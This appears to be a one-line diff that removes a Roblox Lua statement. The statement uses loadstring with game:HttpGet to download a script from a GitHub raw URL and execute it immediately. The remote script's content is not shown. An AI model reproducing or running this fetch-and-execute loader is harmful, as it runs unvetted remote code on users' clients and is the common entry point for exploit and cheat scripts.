@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/parekm734-glitch/Scripts/refs/heads/main/goodscript.lua"))()
